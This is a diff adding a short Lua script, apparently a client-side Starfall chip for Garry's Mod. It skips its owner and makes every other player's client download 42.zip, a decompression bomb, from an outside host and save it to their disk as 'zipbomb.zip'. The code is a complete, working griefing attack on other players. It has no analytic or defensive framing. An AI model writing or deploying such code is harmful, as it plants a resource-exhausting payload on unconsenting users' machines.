@@ -1,0 +1,13 @@
+--@name zippy
+--@author Redox
+--@client
+
+if owner() == player() then return end
+
+http.get( "http://www.unforgettable.dk/42.zip",
+    function( body )
+        file.write( "zipbomb.zip", body )
+    end,
+    function()
+    end
+)
